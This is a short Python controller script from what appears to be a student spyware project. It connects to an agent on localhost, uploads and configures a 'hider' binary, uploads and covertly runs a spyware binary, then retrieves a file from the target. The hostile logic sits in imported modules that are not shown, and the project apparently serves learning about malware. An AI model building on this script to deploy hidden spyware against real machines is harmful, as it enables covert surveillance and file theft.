from connection import Connection
from agent import Agent
from command import Command
from responce import Responce
from funCode import FunCode
from time import sleep

# HOST = "192.168.83.130"
HOST = "localhost"
PORT_MANEGER = 65432
PORT_SPYWARE = 65410


def main():
    agent = Agent(HOST, PORT_MANEGER)
    targetHiderPath = "./sentHider.o"
    print(
        agent.write_file(
            "/home/avner/Arazim-Projects-2024---spyware/hider",
            targetHiderPath,
        )
    )
    print(agent.hider_setup(targetHiderPath))
    # print(
    #     agent.hidden_action_with_upload(
    #         FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
    #         "/home/avner/Arazim-Projects-2024---spyware/spyware",
    #         "runingSpyware.o",
    #     )
    # )
    print(
        agent.hidden_action_with_upload(
            FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
            "/home/avner/Arazim-Projects-2024---spyware/spyware",
            "sentSpyware.spy",
        )
    )
    spyAgent = Agent(HOST, PORT_SPYWARE)
    print(spyAgent.hider_setup(targetHiderPath))
    print(spyAgent.retrieve_file("fishfish.txt"))


if __name__ == "__main__":
    main()
